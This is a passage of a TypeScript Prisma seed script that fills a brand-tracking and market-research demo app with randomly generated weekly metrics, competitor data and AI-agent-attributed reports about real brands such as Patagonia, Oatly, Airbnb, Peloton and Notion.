    const metrics = generateBrandMetricsForDate(68, 85, 72, 35 - week, 36, 'up')

    patagoniaSnapshots.push({
      brandTrackingId: patagoniaBrandTracking.id,
      orgId: acmeCorp.id,
      snapshotDate,
      metrics,
      brandHealth: metrics.brandHealth,
      awareness: metrics.awareness,
      consideration: metrics.consideration,
      preference: metrics.preference,
      loyalty: metrics.loyalty,
      nps: metrics.nps,
      marketShare: 12 + Math.random() * 6,
      sentimentScore: 0.75 + Math.random() * 0.2,
      competitorData: {
        'The North Face': { awareness: 78 + Math.random() * 5, consideration: 52 + Math.random() * 8, marketShare: 22 + Math.random() * 4, sentiment: 0.65 + Math.random() * 0.15 },
        'REI': { awareness: 62 + Math.random() * 8, consideration: 48 + Math.random() * 8, marketShare: 15 + Math.random() * 4, sentiment: 0.72 + Math.random() * 0.12 },
        'Arc\'teryx': { awareness: 45 + Math.random() * 8, consideration: 38 + Math.random() * 6, marketShare: 8 + Math.random() * 3, sentiment: 0.78 + Math.random() * 0.1 },
        'Columbia': { awareness: 72 + Math.random() * 6, consideration: 42 + Math.random() * 6, marketShare: 18 + Math.random() * 4, sentiment: 0.58 + Math.random() * 0.15 },
        'Cotopaxi': { awareness: 28 + Math.random() * 8, consideration: 22 + Math.random() * 6, marketShare: 4 + Math.random() * 2, sentiment: 0.82 + Math.random() * 0.1 },
      },
      audienceBreakdown: {
        '18-24': { awareness: metrics.awareness * 1.08, preference: metrics.preference * 1.15, nps: metrics.nps * 1.1 },
        '25-34': { awareness: metrics.awareness * 1.2, preference: metrics.preference * 1.3, nps: metrics.nps * 1.15 },
        '35-44': { awareness: metrics.awareness * 1.1, preference: metrics.preference * 1.2, nps: metrics.nps * 1.1 },
        '45-54': { awareness: metrics.awareness * 0.95, preference: metrics.preference * 1.05, nps: metrics.nps * 1.0 },
        '55+': { awareness: metrics.awareness * 0.8, preference: metrics.preference * 0.85, nps: metrics.nps * 0.95 },
      },
      insights: week === 0 ? [
        'Highest NPS in outdoor apparel category at 74 - sustainability messaging resonating strongly',
        '"Don\'t Buy This Jacket" philosophy driving 28% higher brand loyalty than competitors',
        'Worn Wear program contributing to 15% repeat purchase rate increase',
        '25-34 demographic showing exceptional engagement - key growth segment identified',
        'Recommendation: Expand Worn Wear program and amplify repair/reuse messaging'
      ] : [],
    })
  }
  await prisma.brandTrackingSnapshot.createMany({ data: patagoniaSnapshots })

  // Oatly Brand Tracking - Challenger brand, rapid growth
  const oatlyBrandTracking = await prisma.brandTracking.create({
    data: {
      id: '5',
      orgId: acmeCorp.id,
      brandName: 'Oatly',
      description: 'Plant-based dairy alternative leader. Tracking brand disruption metrics, awareness growth, and competitive positioning in alt-milk category.',
      industry: 'Plant-Based Foods & Beverages',
      competitors: ['Califia Farms', 'Silk', 'Alpro', 'Minor Figures', 'Planet Oat'],
      audiences: ['Vegans & Vegetarians', 'Lactose Intolerant', 'Health-Conscious Millennials', 'Coffee Culture'],
      status: BrandTrackingStatus.ACTIVE,
      schedule: '0 10 * * 1',
      metrics: {
        brandAwareness: true,
        consideration: true,
        preference: true,
        loyalty: true,
        nps: true,
        sentimentAnalysis: true
      },
      alertThresholds: {
        brandHealth: { min: 60, max: 100 },
        awareness: { min: 40, max: 100 }
      },
      createdBy: johnDoe.id,
      snapshotCount: 28,
      lastSnapshot: new Date(now.getTime() - 12 * 60 * 60 * 1000),
    }
  })

  const oatlySnapshots = []
  for (let week = 27; week >= 0; week--) {
    const snapshotDate = new Date(now.getTime() - week * 7 * 24 * 60 * 60 * 1000)
    const metrics = generateBrandMetricsForDate(52, 72, 55, 27 - week, 28, 'up')

    oatlySnapshots.push({
      brandTrackingId: oatlyBrandTracking.id,
      orgId: acmeCorp.id,
      snapshotDate,
      metrics,
      brandHealth: metrics.brandHealth,
      awareness: metrics.awareness,
      consideration: metrics.consideration,
      preference: metrics.preference,
      loyalty: metrics.loyalty,
      nps: metrics.nps,
      marketShare: 18 + Math.random() * 8,
      sentimentScore: 0.68 + Math.random() * 0.2,
      competitorData: {
        'Califia Farms': { awareness: 42 + Math.random() * 8, consideration: 35 + Math.random() * 6, marketShare: 15 + Math.random() * 4, sentiment: 0.7 + Math.random() * 0.12 },
        'Silk': { awareness: 68 + Math.random() * 6, consideration: 45 + Math.random() * 6, marketShare: 25 + Math.random() * 5, sentiment: 0.58 + Math.random() * 0.15 },
        'Alpro': { awareness: 55 + Math.random() * 8, consideration: 38 + Math.random() * 6, marketShare: 18 + Math.random() * 4, sentiment: 0.62 + Math.random() * 0.15 },
        'Minor Figures': { awareness: 22 + Math.random() * 8, consideration: 18 + Math.random() * 5, marketShare: 5 + Math.random() * 2, sentiment: 0.78 + Math.random() * 0.1 },
        'Planet Oat': { awareness: 38 + Math.random() * 8, consideration: 28 + Math.random() * 6, marketShare: 12 + Math.random() * 4, sentiment: 0.6 + Math.random() * 0.15 },
      },
      audienceBreakdown: {
        '18-24': { awareness: metrics.awareness * 1.25, preference: metrics.preference * 1.35, nps: metrics.nps * 1.2 },
        '25-34': { awareness: metrics.awareness * 1.3, preference: metrics.preference * 1.4, nps: metrics.nps * 1.25 },
        '35-44': { awareness: metrics.awareness * 1.05, preference: metrics.preference * 1.1, nps: metrics.nps * 1.05 },
        '45-54': { awareness: metrics.awareness * 0.85, preference: metrics.preference * 0.8, nps: metrics.nps * 0.9 },
        '55+': { awareness: metrics.awareness * 0.6, preference: metrics.preference * 0.55, nps: metrics.nps * 0.8 },
      },
      insights: week === 0 ? [
        'Awareness grew 45% YoY - fastest growth in plant-based category',
        'Coffee shop partnerships (Starbucks, Blue Bottle) driving 65% of trial conversions',
        'Distinctive packaging and brand voice creating 2x share of voice vs. competitors',
        'Gen Z preference 40% higher than category average - brand personality resonating',
        'Recommendation: Expand barista edition line and deepen specialty coffee partnerships'
      ] : [],
    })
  }
  await prisma.brandTrackingSnapshot.createMany({ data: oatlySnapshots })

  // Airbnb Brand Tracking - Travel recovery, strong brand
  const airbnbBrandTracking = await prisma.brandTracking.create({
    data: {
      id: '6',
      orgId: techStartup.id,
      brandName: 'Airbnb',
      description: 'Travel accommodation marketplace. Tracking brand recovery post-pandemic, trust metrics, and competitive positioning against traditional hospitality.',
      industry: 'Travel & Hospitality',
      competitors: ['Booking.com', 'Vrbo', 'Hotels.com', 'Expedia', 'Marriott Bonvoy'],
      audiences: ['Millennial Travelers', 'Remote Workers', 'Experience Seekers', 'Budget Travelers'],
      status: BrandTrackingStatus.ACTIVE,
      schedule: '0 6 * * 2',
      metrics: {
        brandAwareness: true,
        consideration: true,
        preference: true,
        loyalty: true,
        nps: true,
        sentimentAnalysis: true
      },
      alertThresholds: {
        brandHealth: { min: 65, max: 100 },
        nps: { min: 30, max: 100 }
      },
      createdBy: bobWilson.id,
      snapshotCount: 42,
      lastSnapshot: new Date(now.getTime() - 18 * 60 * 60 * 1000),
    }
  })

  const airbnbSnapshots = []
  for (let week = 41; week >= 0; week--) {
    const snapshotDate = new Date(now.getTime() - week * 7 * 24 * 60 * 60 * 1000)
    const metrics = generateBrandMetricsForDate(82, 76, 45, 41 - week, 42, 'up')

    airbnbSnapshots.push({
      brandTrackingId: airbnbBrandTracking.id,
      orgId: techStartup.id,
      snapshotDate,
      metrics,
      brandHealth: metrics.brandHealth,
      awareness: metrics.awareness,
      consideration: metrics.consideration,
      preference: metrics.preference,
      loyalty: metrics.loyalty,
      nps: metrics.nps,
      marketShare: 22 + Math.random() * 8,
      sentimentScore: 0.62 + Math.random() * 0.22,
      competitorData: {
        'Booking.com': { awareness: 85 + Math.random() * 5, consideration: 58 + Math.random() * 8, marketShare: 28 + Math.random() * 5, sentiment: 0.6 + Math.random() * 0.15 },
        'Vrbo': { awareness: 58 + Math.random() * 8, consideration: 38 + Math.random() * 6, marketShare: 15 + Math.random() * 4, sentiment: 0.58 + Math.random() * 0.15 },
        'Hotels.com': { awareness: 72 + Math.random() * 6, consideration: 45 + Math.random() * 6, marketShare: 18 + Math.random() * 4, sentiment: 0.55 + Math.random() * 0.15 },
        'Expedia': { awareness: 78 + Math.random() * 5, consideration: 48 + Math.random() * 6, marketShare: 20 + Math.random() * 4, sentiment: 0.52 + Math.random() * 0.18 },
        'Marriott Bonvoy': { awareness: 65 + Math.random() * 8, consideration: 42 + Math.random() * 6, marketShare: 22 + Math.random() * 5, sentiment: 0.68 + Math.random() * 0.12 },
      },
      audienceBreakdown: {
        '18-24': { awareness: metrics.awareness * 1.1, preference: metrics.preference * 1.2, nps: metrics.nps * 1.15 },
        '25-34': { awareness: metrics.awareness * 1.15, preference: metrics.preference * 1.25, nps: metrics.nps * 1.1 },
        '35-44': { awareness: metrics.awareness * 1.05, preference: metrics.preference * 1.1, nps: metrics.nps * 1.0 },
        '45-54': { awareness: metrics.awareness * 0.95, preference: metrics.preference * 0.9, nps: metrics.nps * 0.95 },
        '55+': { awareness: metrics.awareness * 0.8, preference: metrics.preference * 0.7, nps: metrics.nps * 0.85 },
      },
      insights: week === 0 ? [
        'Brand trust scores recovering - up 18 points from 2022 low',
        'Experiences category driving 35% of new user acquisition',
        'Remote work trend benefiting long-stay bookings (28+ days up 65%)',
        'Host quality concerns impacting NPS - verification program helping',
        'Recommendation: Amplify guest protection messaging and host quality initiatives'
      ] : [],
    })
  }
  await prisma.brandTrackingSnapshot.createMany({ data: airbnbSnapshots })

  // Peloton Brand Tracking - Declining trend, needs attention
  const pelotonBrandTracking = await prisma.brandTracking.create({
    data: {
      id: '7',
      orgId: enterpriseCo.id,
      brandName: 'Peloton',
      description: 'Connected fitness platform. Monitoring brand health during market correction, subscriber retention, and competitive threats from traditional fitness.',
      industry: 'Connected Fitness & Wellness',
      competitors: ['Apple Fitness+', 'Mirror', 'Tonal', 'NordicTrack', 'Echelon'],
      audiences: ['Home Fitness Enthusiasts', 'Affluent Millennials', 'Working Parents', 'Fitness Beginners'],
      status: BrandTrackingStatus.ACTIVE,
      schedule: '0 7 * * 1',
      metrics: {
        brandAwareness: true,
        consideration: true,
        preference: true,
        loyalty: true,
        nps: true,
        sentimentAnalysis: true
      },
      alertThresholds: {
        brandHealth: { min: 55, max: 100 },
        nps: { min: 25, max: 100 }
      },
      createdBy: sarahEnterprise.id,
      snapshotCount: 65,
      lastSnapshot: new Date(now.getTime() - 6 * 60 * 60 * 1000),
    }
  })

  const pelotonSnapshots = []
  for (let week = 64; week >= 0; week--) {
    const snapshotDate = new Date(now.getTime() - week * 7 * 24 * 60 * 60 * 1000)
    const metrics = generateBrandMetricsForDate(75, 68, 42, 64 - week, 65, 'down')

    pelotonSnapshots.push({
      brandTrackingId: pelotonBrandTracking.id,
      orgId: enterpriseCo.id,
      snapshotDate,
      metrics,
      brandHealth: metrics.brandHealth,
      awareness: metrics.awareness,
      consideration: metrics.consideration,
      preference: metrics.preference,
      loyalty: metrics.loyalty,
      nps: metrics.nps,
      marketShare: 35 + Math.random() * 10 - (64 - week) * 0.2,
      sentimentScore: 0.5 + Math.random() * 0.25,
      competitorData: {
        'Apple Fitness+': { awareness: 72 + Math.random() * 6, consideration: 48 + Math.random() * 8, marketShare: 22 + Math.random() * 5, sentiment: 0.75 + Math.random() * 0.1 },
        'Mirror': { awareness: 35 + Math.random() * 8, consideration: 22 + Math.random() * 6, marketShare: 8 + Math.random() * 3, sentiment: 0.6 + Math.random() * 0.15 },
        'Tonal': { awareness: 32 + Math.random() * 8, consideration: 25 + Math.random() * 6, marketShare: 6 + Math.random() * 3, sentiment: 0.72 + Math.random() * 0.12 },
        'NordicTrack': { awareness: 65 + Math.random() * 6, consideration: 42 + Math.random() * 6, marketShare: 18 + Math.random() * 4, sentiment: 0.55 + Math.random() * 0.18 },
        'Echelon': { awareness: 42 + Math.random() * 8, consideration: 32 + Math.random() * 6, marketShare: 12 + Math.random() * 4, sentiment: 0.58 + Math.random() * 0.15 },
      },
      audienceBreakdown: {
        '18-24': { awareness: metrics.awareness * 0.85, preference: metrics.preference * 0.8, nps: metrics.nps * 0.9 },
        '25-34': { awareness: metrics.awareness * 1.1, preference: metrics.preference * 1.15, nps: metrics.nps * 1.05 },
        '35-44': { awareness: metrics.awareness * 1.2, preference: metrics.preference * 1.25, nps: metrics.nps * 1.1 },
        '45-54': { awareness: metrics.awareness * 1.05, preference: metrics.preference * 1.1, nps: metrics.nps * 1.0 },
        '55+': { awareness: metrics.awareness * 0.75, preference: metrics.preference * 0.7, nps: metrics.nps * 0.85 },
      },
      insights: week === 0 ? [
        'ALERT: Brand health declined 12 points over past 6 months - requires immediate attention',
        'Apple Fitness+ gaining significant ground in consideration metrics (+22% YoY)',
        'Core loyalists (35-44) maintaining strong NPS but new user acquisition struggling',
        'Price perception issue identified - 45% cite cost as barrier to consideration',
        'Recommendation: Focus on value messaging and introduce lower-tier subscription options'
      ] : [],
    })
  }
  await prisma.brandTrackingSnapshot.createMany({ data: pelotonSnapshots })

  // Notion Brand Tracking - B2B/Productivity, strong growth
  const notionBrandTracking = await prisma.brandTracking.create({
    data: {
      id: '8',
      orgId: techStartup.id,
      brandName: 'Notion',
      description: 'All-in-one workspace for notes, docs, and project management. Tracking adoption metrics, enterprise penetration, and competitive positioning.',
      industry: 'Productivity Software & SaaS',
      competitors: ['Confluence', 'Coda', 'Monday.com', 'Asana', 'ClickUp'],
      audiences: ['Knowledge Workers', 'Startups', 'Enterprise Teams', 'Students'],
      status: BrandTrackingStatus.ACTIVE,
      schedule: '0 8 * * 3',
      metrics: {
        brandAwareness: true,
        consideration: true,
        preference: true,
        loyalty: true,
        nps: true,
        sentimentAnalysis: true
      },
      alertThresholds: {
        brandHealth: { min: 70, max: 100 },
        nps: { min: 45, max: 100 }
      },
      createdBy: bobWilson.id,
      snapshotCount: 32,
      lastSnapshot: new Date(now.getTime() - 10 * 60 * 60 * 1000),
    }
  })

  const notionSnapshots = []
  for (let week = 31; week >= 0; week--) {
    const snapshotDate = new Date(now.getTime() - week * 7 * 24 * 60 * 60 * 1000)
    const metrics = generateBrandMetricsForDate(62, 80, 65, 31 - week, 32, 'up')

    notionSnapshots.push({
      brandTrackingId: notionBrandTracking.id,
      orgId: techStartup.id,
      snapshotDate,
      metrics,
      brandHealth: metrics.brandHealth,
      awareness: metrics.awareness,
      consideration: metrics.consideration,
      preference: metrics.preference,
      loyalty: metrics.loyalty,
      nps: metrics.nps,
      marketShare: 15 + Math.random() * 8 + (31 - week) * 0.15,
      sentimentScore: 0.72 + Math.random() * 0.18,
      competitorData: {
        'Confluence': { awareness: 72 + Math.random() * 6, consideration: 48 + Math.random() * 6, marketShare: 28 + Math.random() * 5, sentiment: 0.52 + Math.random() * 0.2 },
        'Coda': { awareness: 28 + Math.random() * 8, consideration: 22 + Math.random() * 5, marketShare: 5 + Math.random() * 2, sentiment: 0.7 + Math.random() * 0.12 },
        'Monday.com': { awareness: 58 + Math.random() * 8, consideration: 42 + Math.random() * 6, marketShare: 18 + Math.random() * 4, sentiment: 0.62 + Math.random() * 0.15 },
        'Asana': { awareness: 62 + Math.random() * 6, consideration: 45 + Math.random() * 6, marketShare: 20 + Math.random() * 4, sentiment: 0.6 + Math.random() * 0.15 },
        'ClickUp': { awareness: 45 + Math.random() * 8, consideration: 38 + Math.random() * 6, marketShare: 12 + Math.random() * 4, sentiment: 0.65 + Math.random() * 0.15 },
      },
      audienceBreakdown: {
        '18-24': { awareness: metrics.awareness * 1.3, preference: metrics.preference * 1.4, nps: metrics.nps * 1.2 },
        '25-34': { awareness: metrics.awareness * 1.25, preference: metrics.preference * 1.35, nps: metrics.nps * 1.15 },
        '35-44': { awareness: metrics.awareness * 1.05, preference: metrics.preference * 1.1, nps: metrics.nps * 1.0 },
        '45-54': { awareness: metrics.awareness * 0.8, preference: metrics.preference * 0.75, nps: metrics.nps * 0.9 },
        '55+': { awareness: metrics.awareness * 0.55, preference: metrics.preference * 0.5, nps: metrics.nps * 0.8 },
      },
      insights: week === 0 ? [
        'Enterprise adoption accelerating - 85% YoY growth in teams >100 users',
        'AI features launch driving 40% increase in feature engagement',
        'Student/startup segment showing highest NPS (72) - strong product-market fit',
        'Confluence users actively considering switch - opportunity in enterprise migration',
        'Recommendation: Invest in enterprise sales team and migration tooling'
      ] : [],
    })
  }
  await prisma.brandTrackingSnapshot.createMany({ data: notionSnapshots })

  // Update brand tracking counts
  await prisma.brandTracking.update({ where: { id: nikeBrandTracking.id }, data: { snapshotCount: 52 } })
  await prisma.brandTracking.update({ where: { id: spotifyBrandTracking.id }, data: { snapshotCount: 45 } })
  await prisma.brandTracking.update({ where: { id: teslaBrandTracking.id }, data: { snapshotCount: 78 } })
  await prisma.brandTracking.update({ where: { id: patagoniaBrandTracking.id }, data: { snapshotCount: 36 } })
  await prisma.brandTracking.update({ where: { id: oatlyBrandTracking.id }, data: { snapshotCount: 28 } })
  await prisma.brandTracking.update({ where: { id: airbnbBrandTracking.id }, data: { snapshotCount: 42 } })
  await prisma.brandTracking.update({ where: { id: pelotonBrandTracking.id }, data: { snapshotCount: 65 } })
  await prisma.brandTracking.update({ where: { id: notionBrandTracking.id }, data: { snapshotCount: 32 } })

  // ==================== REPORTS ====================
  console.log('📄 Creating reports...')

  // Create 20 advanced reports organized by solution area with explicit IDs for reliable API access
  // Each report has content formatted for the ReportViewer component:
  // - slides: array of {id, title, thumbnail, content}
  // - citations: array of {source, confidence, dataPoints, markets}
  // - comments, versions, activity: arrays for collaboration features

  // ============================================================================
  // CORE SOLUTION AREA REPORTS (3 reports)
  // ============================================================================
  await prisma.report.create({
    data: {
      id: 'core-1',
      orgId: acmeCorp.id,
      title: 'Global Audience Segmentation Analysis 2024',
      description: 'Deep dive into audience segments across 52 global markets, identifying key behavioral patterns, demographic clusters, and engagement opportunities.',
      type: ReportType.PRESENTATION,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Audience Explorer Agent',
        solutionArea: 'Core',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'This analysis identifies 12 distinct audience segments across 52 global markets, representing 2.8B addressable consumers with 35% growth in the digital-first segment.' },
          { id: 2, title: 'Primary Segments Overview', thumbnail: '/audience-segmentation-pie-chart.jpg', content: 'Digital Natives (485M, +18% growth, Very High engagement), Value Seekers (620M, +8% growth), Premium Aspirers (340M, +22% growth), and Eco-Conscious consumers (280M, +45% growth).' },
          { id: 3, title: 'Demographic Distribution', thumbnail: '/audience-segments-diagram.jpg', content: 'Age breakdown shows 35% Gen Z, 32% Millennials, 22% Gen X, 11% Boomers. Income distribution skews middle-to-upper with geographic concentration in urban centers.' },
          { id: 4, title: 'Behavioral Insights', thumbnail: '/gen-z-consumer-behavior-infographic.jpg', content: 'Key patterns identified: Mobile-first browsing (78%), Social commerce adoption (45%), Subscription fatigue emerging (32% considering cancellations), and Privacy awareness driving decisions (68%).' },
          { id: 5, title: 'Digital Natives Deep Dive', thumbnail: '/trend-analysis-line-graph.jpg', content: 'This segment shows highest engagement rates (8.2% avg), prefers short-form video content, makes purchase decisions within 24 hours, and values authenticity over polish.' },
          { id: 6, title: 'Value Seekers Analysis', thumbnail: '/key-findings-chart-with-statistics.jpg', content: 'Price-sensitive but quality-conscious. 72% compare prices across 3+ platforms. Loyalty programs drive 45% of repeat purchases. Responds best to value-based messaging.' },
          { id: 7, title: 'Market Opportunities', thumbnail: '/key-findings-chart.jpg', content: 'Emerging opportunities in sustainable products (+45% YoY), personalized experiences (3.2x conversion lift), and community-driven brands (highest NPS scores).' },
          { id: 8, title: 'Strategic Recommendations', thumbnail: '/recommendations-bullet-points-slide.jpg', content: 'Prioritize Digital Natives for new launches, develop value messaging for price-sensitive segments, invest in sustainability storytelling, and build community touchpoints.' }
        ],
        citations: [
          { source: 'GWI Core Survey Q4 2024', confidence: 98, dataPoints: 24, markets: 52 },
          { source: 'GWI USA Deep Dive', confidence: 96, dataPoints: 18, markets: 1 },
          { source: 'GWI Zeitgeist Trends', confidence: 94, dataPoints: 15, markets: 15 }
        ],
        comments: [],
        versions: [
          { version: '1.0', date: now.toISOString(), author: 'AI Research Agent', changes: 'Initial report generation' }
        ],
        activity: [
          { action: 'Report generated', user: 'Audience Explorer Agent', timestamp: now.toISOString() }
        ],
        dataSources: ['GWI Core', 'GWI USA', 'GWI Zeitgeist'],
        markets: ['United States', 'United Kingdom', 'Germany', 'France', 'Japan'],
        metadata: { generatedAt: now.toISOString(), period: 'Q4 2024', sampleSize: 850000 }
      },
      thumbnail: '/presentation-slides.png',
      agentId: audienceAnalysisAgent.id,
      views: 892,
      createdBy: adminUser.id
    }
  })

  await prisma.report.create({
    data: {
      id: 'core-2',
      orgId: acmeCorp.id,
      title: 'Millennial vs Gen Z Behavioral Comparison',
      description: 'Comprehensive persona analysis comparing Millennial and Gen Z consumer behaviors, preferences, and brand relationships.',
      type: ReportType.DASHBOARD,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Persona Architect Agent',
        solutionArea: 'Core',
        slides: [
          { id: 1, title: 'Generation Comparison Overview', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Comparing Millennials (25-40, 1.8B population, $4,200 avg spend) with Gen Z (16-24, 2.1B population, $2,800 avg spend). Brand Loyalty Index: Millennials 72, Gen Z 58.' },
          { id: 2, title: 'Platform Preferences', thumbnail: '/media-consumption-bar-chart.jpg', content: 'TikTok: Gen Z 89% vs Millennials 35%. Instagram: Gen Z 85% vs Millennials 78%. YouTube: Gen Z 92% vs Millennials 82%. Facebook: Gen Z 22% vs Millennials 68%.' },
          { id: 3, title: 'Purchase Drivers Analysis', thumbnail: '/audience-segmentation-pie-chart.jpg', content: 'Gen Z prioritizes: Social Proof (82%), Sustainability (78%), Brand Values (75%). Millennials prioritize: Quality (85%), Convenience (78%), Price (72%).' },
          { id: 4, title: 'Content Consumption Patterns', thumbnail: '/gen-z-consumer-behavior-infographic.jpg', content: 'Gen Z: 4.5 hrs daily on social, prefers <60s videos, 3x more likely to discover brands on TikTok. Millennials: 2.8 hrs daily, prefers longer content, uses search for discovery.' },
          { id: 5, title: 'Brand Relationship Dynamics', thumbnail: '/trend-analysis-line-graph.jpg', content: 'Millennials show 40% higher brand loyalty but Gen Z influences 65% of household purchases. Gen Z expects brand activism; Millennials value reliability.' },
          { id: 6, title: 'Key Differentiators Summary', thumbnail: '/key-findings-chart.jpg', content: 'Critical differences: Trust sources (peers vs experts), purchase speed (impulse vs research), value expression (public vs private), platform loyalty (fluid vs sticky).' }
        ],
        citations: [
          { source: 'GWI Core Generational Study', confidence: 97, dataPoints: 32, markets: 45 },
          { source: 'GWI Zeitgeist Q4 2024', confidence: 95, dataPoints: 22, markets: 15 }
        ],
        comments: [],
        versions: [{ version: '1.0', date: now.toISOString(), author: 'Persona Architect Agent', changes: 'Initial generation' }],
        activity: [{ action: 'Dashboard created', user: 'Persona Architect Agent', timestamp: now.toISOString() }],
        metadata: { period: 'Q4 2024', respondents: 125000 }
      },
      thumbnail: '/analytics-dashboard.png',
      agentId: audienceAnalysisAgent.id,
      views: 1247,
      createdBy: johnDoe.id
    }
  })

  await prisma.report.create({
    data: {
      id: 'core-3',
      orgId: acmeCorp.id,
      title: 'Cultural Shifts in Consumer Values Q4 2024',
      description: 'Analysis of emerging cultural trends and shifting consumer values impacting brand perception and purchase behavior.',
      type: ReportType.PDF,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Culture Tracker Agent',
        solutionArea: 'Core',
        slides: [
          { id: 1, title: 'Executive Summary', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Consumer values are undergoing rapid transformation driven by economic uncertainty, climate concerns, and technological disruption. Four major cultural shifts identified.' },
          { id: 2, title: 'Conscious Consumption (+28%)', thumbnail: '/trend-analysis-line-graph.jpg', content: 'Consumers increasingly evaluate purchases through ethical and environmental lens. 72% research brand practices before purchase. Impact: High. Growth: +28% YoY.' },
          { id: 3, title: 'Digital Wellness (+35%)', thumbnail: '/gen-z-consumer-behavior-infographic.jpg', content: 'Growing awareness of screen time and desire for digital-physical balance. 45% actively reducing social media use. Impact: Medium. Growth: +35% YoY.' },
          { id: 4, title: 'Community Over Individualism (+22%)', thumbnail: '/audience-segments-diagram.jpg', content: 'Shift from personal branding to collective experiences and local connections. Local brand preference up 22%. Community-based purchases increasing.' },
          { id: 5, title: 'Authenticity Imperative (+40%)', thumbnail: '/key-findings-chart-with-statistics.jpg', content: 'Rejection of polished marketing in favor of genuine brand communication. UGC trust 3x higher than branded content. Impact: Very High. Growth: +40%.' },
          { id: 6, title: 'Regional Variations', thumbnail: '/presentation-slides.png', content: 'North America: Digital Wellness focus. Europe: Conscious Consumption leadership. APAC: Community and local brand preference. Each region shows unique cultural drivers.' },
          { id: 7, title: 'Implications for Brands', thumbnail: '/key-findings-chart.jpg', content: 'Lead with purpose not product. Embrace imperfection in content. Build community touchpoints. Demonstrate measurable impact. Authenticity is non-negotiable.' },
          { id: 8, title: 'Methodology & Sources', thumbnail: '/data-export-spreadsheet.jpg', content: 'Social listening analysis of 2.5M conversations across 15 markets. Survey of 50,000 respondents. Confidence level: 95%. Data collected Sep-Nov 2024.' }
        ],
        citations: [
          { source: 'GWI Core Values Tracker', confidence: 96, dataPoints: 28, markets: 15 },
          { source: 'Social Listening Analysis', confidence: 92, dataPoints: 45, markets: 15 },
          { source: 'GWI Zeitgeist Cultural Pulse', confidence: 94, dataPoints: 18, markets: 12 }
        ],
        comments: [],
        versions: [{ version: '1.0', date: now.toISOString(), author: 'Culture Tracker Agent', changes: 'Initial report' }],
        activity: [{ action: 'Report generated', user: 'Culture Tracker Agent', timestamp: now.toISOString() }],
        pageCount: 42,
        metadata: { generatedAt: now.toISOString(), markets: 15, conversationsAnalyzed: 2500000 }
      },
      thumbnail: '/pdf-report-document.jpg',
      agentId: marketResearchAgent.id,
      views: 654,
      createdBy: janeSmith.id
    }
  })

  // ============================================================================
  // SALES SOLUTION AREA REPORTS (3 reports)
  // ============================================================================
  await prisma.report.create({
    data: {
      id: 'sales-1',
      orgId: acmeCorp.id,
      title: 'Enterprise Buyer Persona Deep Dive',
      description: 'Detailed buyer personas for enterprise software purchasing, including decision-making patterns, pain points, and engagement preferences.',
      type: ReportType.PRESENTATION,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Buyer Persona Agent',
        solutionArea: 'Sales',
        slides: [
          { id: 1, title: 'Enterprise Buyer Personas Overview', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Three key enterprise buyer personas identified through analysis of 8,500 B2B decision makers. Each persona has distinct motivations, pain points, and preferred engagement channels.' },
          { id: 2, title: 'The Strategic CTO', thumbnail: '/audience-segments-diagram.jpg', content: 'Age: 42-55. Company: Enterprise 1000+. Budget: $500K+. Motivated by digital transformation, cost optimization, competitive advantage. Pain points: Legacy integration, change management, vendor lock-in.' },
          { id: 3, title: 'The Pragmatic VP Engineering', thumbnail: '/key-findings-chart-with-statistics.jpg', content: 'Age: 35-48. Company: Mid-market. Budget: $100K-500K. Motivated by team productivity, technical excellence, scalability. Pain points: Resource constraints, technical debt, talent retention.' },
          { id: 4, title: 'The Innovation Director', thumbnail: '/trend-analysis-line-graph.jpg', content: 'Age: 38-52. Company: Fortune 500. Budget: $1M+. Motivated by market disruption, emerging tech, strategic partnerships. Pain points: ROI demonstration, internal politics, speed to market.' },
          { id: 5, title: 'Buyer Journey Map', thumbnail: '/gen-z-consumer-behavior-infographic.jpg', content: 'Five stages identified: Awareness (content marketing, events), Consideration (demos, case studies), Evaluation (POC, technical review), Decision (procurement, legal), Implementation (onboarding, success).' },
          { id: 6, title: 'Engagement Strategies', thumbnail: '/recommendations-bullet-points-slide.jpg', content: 'Lead with business outcomes not features. Provide technical depth on request. Leverage peer testimonials and references. Offer proof-of-concept programs. Match content to journey stage.' }
        ],
        citations: [
          { source: 'GWI B2B Decision Maker Study', confidence: 96, dataPoints: 28, markets: 8 },
          { source: 'Enterprise Tech Buyer Survey', confidence: 94, dataPoints: 18, markets: 5 }
        ],
        comments: [],
        versions: [{ version: '1.0', date: now.toISOString(), author: 'Buyer Persona Agent', changes: 'Initial personas' }],
        activity: [{ action: 'Report generated', user: 'Buyer Persona Agent', timestamp: now.toISOString() }],
        metadata: { generatedAt: now.toISOString(), personasResearched: 3, respondents: 8500 }
      },
      thumbnail: '/presentation-slides.png',
      agentId: audienceAnalysisAgent.id,
      views: 423,
      createdBy: johnDoe.id
    }
  })

  await prisma.report.create({
    data: {
      id: 'sales-2',
      orgId: acmeCorp.id,
      title: 'Competitive Battlecard: Tech Industry Q4',
      description: 'Sales battlecard with competitive positioning, objection handling, and win strategies against top 5 competitors.',
      type: ReportType.PDF,
      status: ReportStatus.PUBLISHED,
      content: {
        agent: 'Competitive Intelligence Agent',
        solutionArea: 'Sales',
        slides: [
          { id: 1, title: 'Competitive Landscape Overview', thumbnail: '/executive-summary-slide-with-key-metrics.jpg', content: 'Analysis of top 5 competitors by market share, positioning, and recent activity. Win rate analysis based on 340 deals. Key differentiators and positioning strategies identified.' },
          { id: 2, title: 'Competitor A - Market Leader (32%)', thumbnail: '/audience-segments-diagram.jpg', content: 'Positioning: Enterprise-first, premium pricing. Strengths: Brand recognition, ecosystem lock-in, global support. Weaknesses: Slow innovation, complex pricing, poor mid-market fit.' },
          { id: 3, title: 'Win Strategy vs Competitor A', thumbnail: '/key-findings-chart.jpg', content: 'Emphasize agility and TCO advantages. Counter "not established" objection with 40% faster implementation stats. Address integration concerns with 200+ pre-built connectors.' },
          { id: 4, title: 'Competitor B - Challenger (18%)', thumbnail: '/trend-analysis-line-graph.jpg', content: 'Positioning: Price disruptor. Strengths: Aggressive pricing, simple deployment. Weaknesses: Limited features, support issues, scalability concerns. Win strategy: Focus on TCO and enterprise readiness.' },
